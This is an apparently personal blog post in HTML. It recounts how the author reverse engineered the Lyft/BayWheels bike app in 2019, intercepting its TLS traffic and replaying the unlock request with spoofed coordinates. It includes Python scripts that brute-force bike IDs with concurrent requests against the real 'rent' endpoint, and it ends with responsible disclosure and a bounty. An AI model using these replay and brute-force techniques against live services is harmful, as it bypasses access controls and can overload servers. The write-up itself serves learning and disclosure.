<!DOCTYPE html>
<!-- Auto-generated from blog-md/lyft-bikes.md by build.sh -->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Reverse engineering Lyft bikes for fun (and
profit?) - Ilan Bigio</title>
  <link rel="canonical" href="https://ilanbigio.com/blog/lyft-bikes.html">
  <link rel="icon" type="image/png" sizes="48x48" href="/favicon-48x48.png">
  <link rel="icon" type="image/x-icon" href="/favicon.ico">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  <link rel="stylesheet" href="/style.css">
  <link rel="stylesheet" href="/vendor/atom-one-light.min.css" media="(prefers-color-scheme: light)">
  <link rel="stylesheet" href="/vendor/atom-one-dark.min.css" media="(prefers-color-scheme: dark)">
  <script src="/vendor/highlight.min.js"></script>
  <script>document.addEventListener('DOMContentLoaded', () => hljs.highlightAll());</script>
</head>
<body>
  <article>
    <header>
      <div class="article-header-row">
        <a href="/" class="back">← Back</a>
        <a href="/" class="home-icon" aria-label="Home">
          <picture>
            <source srcset="/images/tree-outline-white.svg" media="(prefers-color-scheme: dark)">
            <img src="/images/tree.svg" alt="">
          </picture>
        </a>
      </div>
      <h1>Reverse engineering Lyft bikes for fun (and profit?)</h1>
      <div class="meta-row">
        <time datetime="January 2026">January 2026 · 12 min read</time>
        <a href="https://ilanbigio.substack.com/subscribe" target="_blank">Subscribe →</a>
      </div>
    </header>

<p>One cold San Francisco summer morning in Haight-Ashbury, my commute
down to Market was interrupted by the sight of a lucky duck taking the
last Lyft bike – again.</p>
<p>"I should really just wake up 15 minutes earlier", I thought,
fleetingly. Then instead proceeded to spend the next month reverse
engineering Lyft's private API, bypassing SSL encryption, chasing loose
bikes across the city, triggering an internal incident, and somehow
making a profit.</p>
<p>I learned a lot doing this, so I'm writing it up in case you might
too.</p>
<details id="technical-summary" class="details-block">
<summary>&nbsp;Technical summary, for the impatient (spoilers!)</summary>

<p>Goal: Remotely unlock a Lyft bike.</p>
<p>Steps:</p>
<ol type="1">
<li><a href="#capturing-ios-app-encrypted-traffic">Capturing iOS App
Encrypted Traffic</a> – to re-construct request</li>
<li><a href="#replaying-modified-unlock-request">Replaying Modified
Unlock Request</a> – to bypass geofence</li>
<li><a href="#brute-forcing-bike-id">Brute-forcing Bike ID</a> – since
not available remotely</li>
</ol>
<h2 id="capturing-ios-app-encrypted-traffic">Capturing iOS App Encrypted
Traffic</h2>
<p>I used Charles Proxy to capture outgoing requests from the Lyft app
on my iPhone.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/charles-proxy-routing-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/charles-proxy-routing-black.png" alt="Normal SSL handshake" class="img-inset">
</picture>

<p>Charles supports <code>SSL Proxying</code>, which injects its own
ephemeral certificates during SSL handshake, making sure requests from
both sides are being signed with keys it controls. <picture>
<source srcset="/images/blog/lyft-bikes/normal-handshake-white.png" media="(prefers-color-scheme: dark)">
<img src="/images/blog/lyft-bikes/normal-handshake-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
</picture></p>
<picture>
  <source srcset="/images/blog/lyft-bikes/intercepted-handshake-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/intercepted-handshake-black.png" alt="Intercepted SSL handshake via Charles" class="img-inset">
</picture>

<p>This allows us to decrypt, read, and re-encrypt traffic in
transit.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/reading-encrypted-traffic-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/reading-encrypted-traffic-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
</picture>

<p>The ephemeral certificates are signed by a Charles Certificate
Authority, which needs to be installed on your phone so Charles's
certificates are not rejected. SSL traffic content is then viewable.</p>
<p><img src="/images/blog/lyft-bikes/api-routes.png"
alt="api-routes.png" /></p>
<h2 id="replaying-modified-unlock-request">Replaying Modified Unlock
Request</h2>
<p>From the Charles captures, we see the unlock request uses a
<code>rent</code> endpoint with the following structure:</p>
<pre class="json"><code>POST &quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

HEADERS
{
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
  ...
}

DATA
{
  &quot;userLocation&quot;: { &quot;lat&quot;: 37.7714859, &quot;lon&quot;: -122.4449036 },
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;: &quot;12345&quot; },
  ...
}</code></pre>
<p>A simple python replay script:</p>
<pre class="python"><code>import requests

url=&quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

headers={
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
}

station_coords = { &quot;lat&quot;: 37.7730627, &quot;lon&quot;: -122.4390777 }    # from maps
bike_id = &quot;12345&quot;                                              # dummy id

data={
  &quot;userLocation&quot;: station_coords,
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;:  bike_id},
}

requests.post(url, headers=headers, json=data)</code></pre>
<h2 id="brute-forcing-bike-id">Brute-forcing Bike ID</h2>
<p>Bike IDs are only accessible through the physical bikes (not counting
eBikes, which were out of scope), to unlock one remotely, we need to
brute force it. Five-digit IDs, but in practice only the
<code>10000</code> to <code>20000</code> range is used, so 10,000 IDs to
try.</p>
<p>A naive implementation takes ~3 hours:</p>
<pre class="python"><code>def payload(i):
    return {
        &quot;userLocation&quot;: station_coords,
        &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)</code></pre>
<p>But we can use <code>asyncio</code> and <code>aiohttp</code> to
reduce that to ~15 seconds:</p>
<pre class="python"><code>import asyncio, aiohttp

async def send_one(session, i):                              # non-blocking
  async with session.post(url, headers=headers, json=payload(i)): pass

async def main():
  async with aiohttp.ClientSession() as s:
    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
    await asyncio.gather(*tasks)                             # wait for all

asyncio.run(main())</code></pre>
<p>Et voilà.</p>
</details>

<blockquote>
<p><strong>Disclaimer:</strong> This writeup is meant for educational
purposes only. Vulnerabilities discussed were disclosed to Lyft and
patched in 2019.</p>
</blockquote>
<h2 id="table-of-contents">Table Of Contents</h2>
<ul>
<li><a href="#the-acquisition">The Acquisition</a></li>
<li><a href="#intercepting-ios-app-requests">Intercepting iOS App
Requests</a></li>
<li><a href="#spoofing-ssl-root-certificate-authorities">Spoofing SSL
Root Certificate Authorities</a></li>
<li><a href="#anatomy-of-a-lyft-request">Anatomy of a Lyft
Request</a></li>
<li><a href="#i-promise-its-not-a-denial-of-service-attack">I Promise
it's not a Denial of Service Attack</a></li>
<li><a href="#the-test">The Test</a></li>
<li><a href="#the-good-days">The Good Days</a></li>
<li><a href="#covering-my-ass">Covering My Ass</a></li>
<li><a href="#lessons-learned">Lessons Learned</a></li>
</ul>
<h2 id="the-acquisition">The Acquisition</h2>
<p>Back in 2019 Lyft Bikes (BayWheels) used to be called <a
href="https://automotive.lulop.com/en_EN/post/show/131501/ford-gobike-launching-in-bay-a.html">Ford
GoBikes</a>, and used to be unlocked on a per-station basis. You'd
generate a temporary code for a specific station on your app, then punch
it into that station which would release a random bike.</p>
<img src="/images/blog/lyft-bikes/ford-gobikes.webp" alt="Ford GoBikes" style="border-radius: 8px">

<p>My goal was to make sure nobody would take a bike while I was
on-route to the station, so what if I just kept manually generating
codes until I arrived? Maybe that might block others from doing so. So I
tried it. No luck. Generating a code didn't block others, and that was
the only way to unlock bikes. Welp, nothing left to try...</p>
<p>...until the next day when Lyft, who had apparently just <a
href="https://www.lyft.com/blog/posts/lyft-to-acquire-us-bikeshare-leader">acquired</a>
Ford GoBikes, <a
href="https://www.lyft.com/blog/posts/introducing-bay-wheels-new-bikes-and-a-new-name?utm_source=chatgpt.com">rebranded</a>
it to BayWheels, and changed the whole unlock mechanism. All hail
Lyft.</p>
<p>The new BayWheels map also showed bikes at stations, but now you'd
unlock a bike directly by scanning a QR code on it. Each bike also had a
5-digit number you could use in case scanning didn't work. Cool! This
means maybe if I typed a bike's code into my app when I left my house,
it would be unlocked (and hopefully still there) by the time I arrived?
So I tried it.</p>
<p><code>You are too far from this station.</code></p>
<p>They had geofenced it. I spent a solid day Googling how to spoof GPS
on iPhone but no luck. I then wondered, fatefully, "what does the app
actually send to Lyft during an unlock?", and my journey of capturing
encrypted iOS traffic began.</p>
<h2 id="intercepting-ios-app-requests">Intercepting iOS App
Requests</h2>
<p>If you've used <a
href="https://developer.chrome.com/docs/devtools">Chrome DevTools</a>
(aka <code>Inspect Element</code>) you may have noticed a
<code>Network</code> tab that lets you see the traffic between a website
and its backend. Unfortunately it's not so simple for iOS. Some helpful
Reddit posts led me to <a href="https://www.charlesproxy.com/">Charles
Proxy</a> which lets you see <em>all</em> traffic from your computer,
and a friendly <a
href="https://www.charlesproxy.com/documentation/faqs/using-charles-from-an-iphone/">eight
sentences</a> explained how to wire it up to my phone's traffic. It's
basically a consensual <a
href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle
attack</a>.</p>
<p>First I had to forward my phone's traffic to Charles on my laptop. To
do this I enabled "HTTP Proxy" on my phone's wifi settings, and set the
<code>[ip]:[port]</code> to <code>192.168.0.7:8888</code>:</p>
<ul>
<li><code>192.168.0.7</code> is my laptop's local IP which I got by
running <code>ipconfig getifaddr en0</code></li>
<li><code>8888</code> is the port Charles Proxy is running on</li>
</ul>
<picture>
  <source srcset="/images/blog/lyft-bikes/charles-proxy-routing-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/charles-proxy-routing-black.png" alt="Normal SSL handshake" class="img-inset">
</picture>

<p>Now my traffic was being forwarded to Charles Proxy and huzzah! I
could see all requests coming out of my phone. But... I can't see the
content? Oh, right. SSL<a href="#fn1" class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a> encryption. The thing making sure we
can trust the internet was getting in my way.</p>
<h2 id="spoofing-ssl-root-certificate-authorities">Spoofing SSL Root
Certificate Authorities</h2>
<p>SSL ensures traffic from the Lyft app is encrypted using the
<code>lyft.com</code> public key, so only <code>lyft.com</code> can
decrypt it<a href="#fn2" class="footnote-ref" id="fnref2"
role="doc-noteref"><sup>2</sup></a>. All modern applications &amp;
websites do this, and you can find the public key on a website's <a
href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/">SSL
certificate</a>.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/ssl-cert-dark.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/ssl-cert-light.png" alt="SSL Certificate" class="ssl-cert">
</picture>

<p>In theory, this means my traffic can't be decrypted once it leaves my
phone, even by me. However, Charles has a workaround: by enabling
<code>SSL Proxying</code>, Charles will prevent the real
<code>lyft.com</code> SSL certificate from making it back to your phone,
and instead sends a new one it generates on the fly.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/normal-handshake-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/normal-handshake-black.png" alt="Normal SSL handshake" class="img-inset">
</picture>

<picture>
  <source srcset="/images/blog/lyft-bikes/intercepted-handshake-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/intercepted-handshake-black.png" alt="Intercepted SSL handshake via Charles" class="img-inset">
</picture>

<p>This means your phone is now encrypting <code>lyft.com</code> traffic
with Charles's public key, so Charles can decrypt it, save it, then
re-encrypt it with the <em>real</em> <code>lyft.com</code> cert and
forward it along.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/reading-encrypted-traffic-white.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/reading-encrypted-traffic-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
</picture>

<p>But there's a catch – if anyone between you and Lyft can do this
(coffee shop, cell provider, etc.), how can we ever know the certificate
is really Lyft's? Well, your phone will reject a certificate unless it's
been signed by a Certificate Authority, endorsing it actually belongs to
<code>lyft.com</code>. These CAs are third-party organizations acting
like notaries that issue "root certificates", and your phone comes with
many trusted CA root certificates pre-installed. So Charles just asks
you to install one more root certificate – the Charles Root Certificate,
used to sign all the other certificates Charles creates. And just like
that, my phone trusts Charles, and I can see SSL traffic. <a href="#fn3"
class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<h2 id="anatomy-of-a-lyft-request">Anatomy of a Lyft Request</h2>
<p>So, let's unlock a bike from my phone, shall we?</p>
<p><code>Vehicle not found.</code></p>
<p>Right. Well, I used <code>12345</code> as the bike ID, so that's
expected. Charles managed to capture some traffic anyway. Let's see if
we can find the unlock request.</p>
<p><img src="/images/blog/lyft-bikes/api-routes.png"
alt="api-routes.png" /></p>
<p>So many requests and API routes! I see one endpoint called
<code>rent</code>, which I bet is the unlock request. Let’s look at the
contents.</p>
<pre class="json"><code>POST &quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

HEADERS
{
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
  ...
}

DATA
{
  &quot;userLocation&quot;: { &quot;lat&quot;: 37.7714859, &quot;lon&quot;: -122.4449036 },
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;: &quot;12345&quot; },
  ...
}</code></pre>
<p>Yup, looks like it is. Look at these fields (<em>I omitted the
unrelated, redacted the sensitive.</em>) There's some auth in the
headers (<code>api-key</code>, <code>authorization</code>), the bike
<code>qrCode</code> I used (<code>12345</code>), a <code>memberId</code>
which I assume identifies my account, and... <code>userLocation</code>
coordinates! Bingo. Now I just need to replay that request with a python
script, but set the <code>lat</code>, <code>lon</code> to be right next
to the station (whose coordinates I got using google maps).</p>
<pre class="python"><code>import requests

url=&quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

headers={
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
}

station_coords = { &quot;lat&quot;: 37.7730627, &quot;lon&quot;: -122.4390777 }    # from maps
bike_id = &quot;12345&quot;                                              # dummy id

data={
  &quot;userLocation&quot;: station_coords,
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;:  bike_id},
}

requests.post(url, headers=headers, json=data)</code></pre>
<p>Sweet, now I just needed a real <code>bike_id</code> to test it on.
It was very late at night<a href="#fn4" class="footnote-ref" id="fnref4"
role="doc-noteref"><sup>4</sup></a> but I was excited, so out I went
with my PJs, flip flops, and laptop to squat by my target bike. I found
its ID, entered it into my script, hit run, and holy shit it worked. The
bike unlocked. I re-locked it, ran back to my apartment, hit run again,
ran back, and there she was. Unlocked, and inconspicuously so. Nobody
would think to take it… but me.</p>
<p>I was in business.</p>
<h2 id="i-promise-its-not-a-denial-of-service-attack">I Promise it’s not
a Denial of Service Attack</h2>
<p>Except… the bike IDs are only printed on the bikes. How would I know
what <code>bike_id</code> to use without going to the station? Maybe
some other request Charles captured might have all the bike IDs at a
station? Short answer – no. Two days of digging through captured traffic
yielded no way to fetch bike IDs.<a href="#fn5" class="footnote-ref"
id="fnref5" role="doc-noteref"><sup>5</sup></a></p>
<p>After considering many fruitless ideas, like hiding a little camera
pointed at the bikes and using OCR, I thought… could I just try all IDs?
Five digits, that’s 100,000 combinations… and thinking back, I had only
seen IDs between <code>10000</code> and <code>20000</code>. 10,000 loop
iterations is not <em>that</em> many for python!</p>
<p>This runs in less than a second:</p>
<pre class="python"><code>for i in range(10_000, 20_000):
    print(i)</code></pre>
<p>This, however, takes ~a second <em>per request</em>. So… ~three hours
for 10,000 requests.</p>
<pre class="python"><code>def payload(i):
    return {
        &quot;userLocation&quot;: station_coords,
        &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)</code></pre>
<p>But we don’t have to wait for each request to come back – we can run
them in parallel. After trying <code>multiprocessing</code> and
<code>threading</code>, I massaged a stack overflow code snippet I found
using <code>aiohttp</code> to start a bunch of requests without blocking
on a response. Here’s a slightly<a href="#fn6" class="footnote-ref"
id="fnref6" role="doc-noteref"><sup>6</sup></a> simplified version.</p>
<pre class="python"><code>import asyncio, aiohttp

async def send_one(session, i):                              # non-blocking
  async with session.post(url, headers=headers, json=payload(i)): pass

async def main():
  async with aiohttp.ClientSession() as s:
    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
    await asyncio.gather(*tasks)                             # wait for all

asyncio.run(main())</code></pre>
<p>I benchmarked this against <a
href="https://www.postman.com/">Postman's API</a> (meant for testing)
and it ran in 15 seconds! That's ~650 RPS. But, hm… is that too much for
their servers? In April 2019 <a
href="https://www.sfmta.com/blog/11000-bikes-bike-share-expand-citywide">there
were about 9,000 trips per day</a>, so even if 80% of those all happened
during rush hour (8-10am, 5-7pm) that's still a whopping 0.5 RPS at its
<em>peak</em>. I'd be single-handedly 1,300x-ing their peak traffic on
this endpoint. To be fair, (Google informed me,) 650 RPS is not
<em>that</em> crazy for most servers. But a sudden spike like that might
still look to Lyft like a <a
href="https://en.wikipedia.org/wiki/Denial-of-service_attack">Denial-of-Service
attack</a>...</p>
<div class="form-field">
<div class="form-label">To: security@lyft.com</div>

<p>...which it's not. Let me know if this is an issue and I'll stop.</p>
<p>I'm just a student, please don't call the cops.</p>
<p>Sincerely,</br> Ilan</p>
</div>

<p>Aaaand sent<a href="#fn7" class="footnote-ref" id="fnref7"
role="doc-noteref"><sup>7</sup></a>. Ok now let's run it on all the
IDs.</p>
<h2 id="the-test">The Test</h2>
<p>I'm about to run <code>python unlock_script.py</code> when a thought
occurs to me: Is there <em>any</em> chance, however slim, that I'm about
to unlock every single Lyft Bike in and around the Bay Area? The
geofence should prevent that, <em>in theory</em>. Only the station at my
selected coordinates should respond. But what if it fails? What if– eh
screw it, let's live a little. <a href="#fn8" class="footnote-ref"
id="fnref8" role="doc-noteref"><sup>8</sup></a></p>
<p><code>Enter ⏎</code></p>
<p>10,000 IDs fly through my screen.</p>
<p>1000 not-so-milli seconds tick by. Then, I get my first blessed</p>
<p><code>You are too far from this station.</code></p>
<p>Then another. They start to trickle in, slowly at first, then
suddenly flood my terminal. Ok, that's a good sign. I'm not actively
unlocking the whole city. Then, another second or so pass by,
until...</p>
<pre><code>Bike 12539 unlocked</code></pre>
<p><img src="/images/blog/lyft-bikes/jonah-hill-excited.gif"
alt="Jonah Hill screaming in excitement" /></p>
<p>Hellllll yeah! Oh my freaking god it worked! It actually wor–</p>
<pre><code>Bike 17322 unlocked
Done.</code></pre>
<p>Wait, what? Um. Ok? Two bikes got unlocked? That's strange, my Lyft
membership only allows me to unlock one bike at a time. But hey, a) I
didn't unlock the whole city, and b) it worked, so what do I care. Let's
go find my bikes.</p>
<p>And there they were. Resting peacefully in their docks, but secretly
not actually locked. If someone tried scanning it, they'd just see an
error and try a different one. I had accomplished what I had set out to
do.</p>
<h2 id="the-good-days">The Good Days</h2>
<p>And boy was it nice. Every morning I'd wake up, get ready for work,
run my script, glance at the unlocked ID (sometimes two), leisurely
stroll to the station, (re-lock the second bike if necessary), and be on
my merry way.</p>
<p>I mostly kept this to myself, and a few trusted people including my
parents, who were happy for me but nervous that I was now certainly a
criminal waiting to be arrested.</p>
<p>But what fun, and what a pleasantly happy ending to this
adventure.</p>
<div class="chat">
<div class="chat-time">Jun 21, 2019, 12:27 PM</div>
<div class="msg them">hey ilan! super random, but are you doing anything with the lyft bikes api?</div>
</div>

<p>What.</p>
<p>Oh no.</p>
<div class="chat">
<div class="msg me">Hey! um, potentially? Why?</div>
<div class="msg them">oh lmao. i'm interning here and just saw a sev email about this and for some reason thought of you</div>
</div>

<p>Oh no.</p>
<div class="chat">
<div class="chat-time">12:54 PM</div>
<div class="msg me">Oh lol wait is sev "severe"?</div>
<div class="msg me">Should I stop?</div>
<div class="msg them">It just means there was an incident lol</div>
<div class="msg them">were you reverse engineering endpoints?</div>
<div class="msg me">Ok I'm I don't want to get in trouble so</div>
<div class="msg them">loll</div>
<div class="msg me">Yeah, why?</div>
<div class="msg them">ok yeah that's what the email was about</div>
<div class="chat-time">12:58 PM</div>
<div class="msg me">Hmmmmm should I be nervous?</div>
<div class="msg them">It says "potentially DoS but probably just trying to reverse engineer"</div>
<div class="msg them">lmao</div>
<div class="msg them">I think just stop doing it</div>
</div>

<p>Panic? Panic.</p>
<h2 id="covering-my-ass">Covering My Ass</h2>
<p>I think I spent ~two and a half minutes hyperventilating before I
decided to start using my brain. I hadn't <em>intended</em> for this to
cause an issue for Lyft: I had done the math, sanity checked with
Google, and even let them know in advance. Even still, this could be
interpreted maliciously and it'd be nice not to get arrested. So... what
to do?</p>
<p>Well, how do hackers avoid getting arrested? Responsible disclosure!
Companies will give bounties to people who report vulnerabilities, so
hackers can keep hacking legally, and companies get to fix issues.
Win-win! And maybe, just maybe, this might keep me out of jail.
Win-win-win!</p>
<p>So I found <a href="https://www.hackerone.com/">HackerOne</a>, and
immediately a problem: <a
href="https://www.lyft.com/security#:~:text=Denial%20of%20service-,Brute%2Dforce%20attacks,-Spamming">Lyft's
vulnerability disclosure guidelines</a> state brute-force approaches
aren't eligible. In reality, my approach wasn't bypassing anything at
all – I was still unlocking a bike and paying like normal. No bugs to be
reported. Although... the second bike! Definitely not normal behavior,
and I wasn't getting charged for it. Let's hope it's enough to show I
come in peace.</p>
<div class="form-field">
<div class="form-label">HackerOne Report</div>

<p><strong>Summary:</strong> This vulnerability is specifically for the
BayWheels bike sharing service. By brute-forcing the <a
href="https://layer.bicyclesharing.net/mobile/v2/fgb/rent">https://layer.bicyclesharing.net/mobile/v2/fgb/rent</a>
endpoint, an attacker is able to unlock more than one bicycle at a given
station.</p>
<p><strong>Proof of Concept:</strong> Trivial.</p>
<p><strong>Steps To Reproduce:</strong></p>
<ol type="1">
<li>Locate relevant auth info (api-key and authorization code) from
downloaded app (possibly using Charles proxy MitM).</li>
<li>Discover rent endpoint (also using Charles proxy).</li>
<li>Quickly send rent requests for all possible bike IDs.</li>
<li>Retrieve bike.</li>
</ol>
<p><strong>Impact:</strong> An attacker could unlock more than one bike
without having to go through the paywall.</p>
</div>

<p>(Yes I'm embarrassed to say I did actually write "trivial" because I
was nervous about sharing my code.)</p>
<p>And now we wait. Except by sheer coincidence<a href="#fn9"
class="footnote-ref" id="fnref9" role="doc-noteref"><sup>9</sup></a>, my
summer roommate was <em>also</em> working at Lyft, and found the thread
discussing my vulnerability report. Apparently some claimed it was
ineligible, but one very nice man was arguing it was legit. Wondering
whether I'd get arrested had suddenly turned into hoping I'd get paid
instead. What a world we live in.</p>
<p><strong><em>Huge</em> thank you to the security team at Lyft for
working with me to resolve the issue!</strong> Even despite my
somewhat... unorthodox methods.</p>
<p>In the end, I got a nice little $250 bounty, with an additional $250
bonus for a "good report". I then did the only thing I could imagine
doing with $500 as a student and threw a completely stocked little house
party...</p>
<p>...and, naturally, invited all the Lyft interns.</p>
<h2 id="lessons-learned">Lessons Learned</h2>
<p>So what did I learn?</p>
<ol type="1">
<li>Even scary "physical" systems have digital interfaces you may
recognize.</li>
<li>There's few better ways to learn about a system than reverse
engineering.</li>
<li>Curiosity and determination are unreasonably effective, and seem to
create luck.</li>
</ol>
<p>If you made it to the end, you might just enjoy this stuff. So I
leave you with homework: <strong>Go reverse engineer something.</strong>
Just, be nice about it.</p>
<p>Happy hacking.</p>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li id="fn1"><p>TLS, SSL. Tomato, potato.<a href="#fnref1"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2"><p>Slight simplification. In reality, SSL <a
href="https://en.wikipedia.org/wiki/Public-key_cryptography">asymmetric
keys</a> are slow, so they're only used during the handshake to encrypt
faster <a
href="https://en.wikipedia.org/wiki/Symmetric-key_algorithm#:~:text=However%2C%20symmetric%2Dkey%20encryption%20algorithms%20are%20usually%20better%20for%20bulk%20encryption.">symmetric
keys</a>, which then encrypt everything else.<a href="#fnref2"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3"><p>Even after this setup, I noticed some encrypted content
was still not readable. Turns out some apps use Certificate Pinning,
which means they come pre-installed with the server certificate they
expect. So even if Charles intercepts the handshake, they will encrypt
traffic with the pinned certificate. Pinned certs are a PAIN to get
around. Glad I didn't have to.<a href="#fnref3" class="footnote-back"
role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p>10:30pm in San Francisco.<a href="#fnref4"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5"><p>Except for eBikes, which were very few at this point,
and which flash very conspicuously when unlocked as I found out after
having to trek to re-lock one I accidentally unlocked across the city
during testing.<a href="#fnref5" class="footnote-back"
role="doc-backlink">↩︎</a></p></li>
<li id="fn6"><p>I also used <a
href="https://en.wikipedia.org/wiki/Semaphore_(programming)">semaphores</a>
to limit concurrency, but they make the code harder to follow.<a
href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7"><p>Maybe a slightly more professional version.<a
href="#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8"><p>I did, in fact, test this out with smaller ID ranges to
convince myself I wasn't unlocking bikes at other stations. But I had
never run the full-range test so I was still nervous (and it sounds more
exciting this way.)<a href="#fnref8" class="footnote-back"
role="doc-backlink">↩︎</a></p></li>
<li id="fn9"><p>Or cosmic fate.<a href="#fnref9" class="footnote-back"
role="doc-backlink">↩︎</a></p></li>
</ol>
</section>

    <div class="subscribe-callout" id="subscribe-callout">
      <p>I may write something every few months or so. Who knows? (You might.)</p>
      <form class="subscribe-form" onsubmit="window.open('https://ilanbigio.substack.com/subscribe?just_signed_up=true&skip_redirect_check=true&utm_medium=web&utm_source=embed&freeSignupEmail=' + encodeURIComponent(this.email.value), '_blank'); return false;">
        <input type="email" name="email" placeholder="your@email.com" required autocomplete="off" data-1p-ignore data-lpignore="true" data-form-type="other">
        <button type="submit" class="subscribe-btn">Subscribe</button>
      </form>
    </div>
    <script>
      const footnotes = document.querySelector('.footnotes');
      const callout = document.getElementById('subscribe-callout');
      if (footnotes && callout) footnotes.before(callout);
    </script>
  </article>
</body>
</html>
